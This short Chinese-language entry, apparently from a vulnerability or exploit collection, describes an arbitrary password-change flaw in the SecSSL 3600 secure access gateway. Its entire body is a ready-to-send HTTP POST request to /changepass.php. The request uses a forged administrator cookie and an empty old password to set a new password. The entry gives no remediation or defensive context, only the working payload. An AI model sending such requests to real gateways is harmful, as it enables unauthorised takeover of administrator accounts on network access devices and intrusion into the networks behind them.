
## 某神 SecSSL 3600安全接入网关系统 任意密码修改漏洞
```
POST /changepass.php?type=2 

Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"test","subAuthId":"1"}
old_pass=&password=Test123!@&repassword=Test123!@

```
